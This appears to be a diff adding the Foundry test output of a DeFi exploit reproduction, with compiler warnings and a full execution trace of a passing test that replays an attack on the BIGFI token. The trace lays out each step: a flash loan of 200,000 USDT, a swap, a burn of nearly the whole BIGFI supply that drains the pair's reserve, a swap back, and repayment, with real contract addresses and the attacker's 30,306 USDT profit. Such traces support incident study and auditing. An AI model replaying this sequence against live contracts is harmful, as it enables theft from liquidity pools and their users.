@@ -1,0 +1,198 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.21s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> src/test/2023-03/BIGFI_exp.sol:24:5:
+   |
+24 |     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+    --> src/test/interface.sol:1582:1:
+     |
+1582 | interface USDT {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 232.22ms (409.86µs CPU time)
+
+Ran 1 test for src/test/2023-03/BIGFI_exp.sol:ContractTest
+[PASS] testExploit() (gas: 358268)
+Logs:
+  Attacker USDT balance after exploit: 30306.103328283570349973
+
+Traces:
+  [369468] ContractTest::testExploit()
+    ├─ [355357] swapFlashLoan::flashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDT: [0x55d398326f99059fF775485246999027B3197955], 200000000000000000000000 [2e23], 0x00)
+    │   ├─ [352658] 0x5F10b4FC66331f53912a5B5EBA4E4e79a6fDAe93::flashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDT: [0x55d398326f99059fF775485246999027B3197955], 200000000000000000000000 [2e23], 0x00) [delegatecall]
+    │   │   ├─ [2531] USDT::balanceOf(swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13]) [staticcall]
+    │   │   │   └─ ← [Return] 877996854972972475361000 [8.779e23]
+    │   │   ├─ [10871] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 200000000000000000000000 [2e23])
+    │   │   │   ├─ emit Transfer(from: swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 200000000000000000000000 [2e23])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [305636] ContractTest::executeOperation(swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13], USDT: [0x55d398326f99059fF775485246999027B3197955], 200000000000000000000000 [2e23], 160000000000000000000 [1.6e20], 0x00)
+    │   │   │   ├─ [24562] USDT::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 200000010000000000000000 [2e23]
+    │   │   │   ├─ [164894] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(200000010000000000000000 [2e23], 0, [0x55d398326f99059fF775485246999027B3197955, 0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1679488640 [1.679e9])
+    │   │   │   │   ├─ [10834] USDT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], 200000010000000000000000 [2e23])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], value: 200000010000000000000000 [2e23])
+    │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640563839457574007913129639935 [1.157e77])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [12052] BIGFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [2893] Pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 107480664198219600542112 [1.074e23], 9310990259680030849404 [9.31e21], 1679487323 [1.679e9]
+    │   │   │   │   ├─ [531] USDT::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 307480674198219600542112 [3.074e23]
+    │   │   │   │   ├─ [124390] Pair::swap(0, 6051008437863879112730 [6.051e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [88487] BIGFI::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6051008437863879112730 [6.051e21])
+    │   │   │   │   │   │   ├─ emit Transfer(from: Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], to: 0x000000000000000000000000000000000000dEaD, value: 60510084378638791127 [6.051e19])
+    │   │   │   │   │   │   ├─ emit Transfer(from: Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5869478184727962739349 [5.869e21])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 307480674198219600542112 [3.074e23]
+    │   │   │   │   │   ├─ [2052] BIGFI::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 3259991215302060148662 [3.259e21]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 307480674198219600542112 [3.074e23], reserve1: 3259991215302060148662 [3.259e21])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 200000010000000000000000 [2e23], amount1In: 9393485908411988 [9.393e15], amount0Out: 0, amount1Out: 6051008437863879112730 [6.051e21], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2052] BIGFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5869495097356201647072 [5.869e21]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [2052] BIGFI::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3259991215302060148662 [3.259e21]
+    │   │   │   ├─ [449] BIGFI::totalSupply() [staticcall]
+    │   │   │   │   └─ ← [Return] 20999908387034241742907242 [2.099e25]
+    │   │   │   ├─ [449] BIGFI::totalSupply() [staticcall]
+    │   │   │   │   └─ ← [Return] 20999908387034241742907242 [2.099e25]
+    │   │   │   ├─ [3336] BIGFI::burn(20999908387034241742894360 [2.099e25])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 20999908387034241742894360 [2.099e25])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [10495] Pair::sync()
+    │   │   │   │   ├─ [531] USDT::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 307480674198219600542112 [3.074e23]
+    │   │   │   │   ├─ [2052] BIGFI::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1
+    │   │   │   │   ├─ emit Sync(reserve0: 307480674198219600542112 [3.074e23], reserve1: 1)
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [24688] BIGFI::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2052] BIGFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3
+    │   │   │   ├─ [50768] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(3, 0, [0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1679488640 [1.679e9])
+    │   │   │   │   ├─ [19687] BIGFI::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], 3)
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 0)
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], value: 3)
+    │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639932 [1.157e77])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [893] Pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 307480674198219600542112 [3.074e23], 1, 1679488640 [1.679e9]
+    │   │   │   │   ├─ [2052] BIGFI::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4
+    │   │   │   │   ├─ [19882] Pair::swap(230466103328283570349973 [2.304e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [3271] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 230466103328283570349973 [2.304e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 230466103328283570349973 [2.304e23])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 77014570869936030192139 [7.701e22]
+    │   │   │   │   │   ├─ [2052] BIGFI::balanceOf(Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4
+    │   │   │   │   │   ├─ emit Sync(reserve0: 77014570869936030192139 [7.701e22], reserve1: 4)
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 3, amount0Out: 230466103328283570349973 [2.304e23], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 230466103328283570349973 [2.304e23]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [3271] USDT::transfer(swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13], 200160000000000000000000 [2.001e23])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13], value: 200160000000000000000000 [2.001e23])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [531] USDT::balanceOf(swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13]) [staticcall]
+    │   │   │   └─ ← [Return] 878156854972972475361000 [8.781e23]
+    │   │   ├─ emit FlashLoan(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 3, param2: 200000000000000000000000 [2e23], param3: 160000000000000000000 [1.6e20], param4: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 30306103328283570349973 [3.03e22]
+    ├─ [2425] USDT::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker USDT balance after exploit", val: 30306103328283570349973 [3.03e22], decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.94s (2.41s CPU time)
+
+Ran 2 test suites in 2.95s (3.18s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
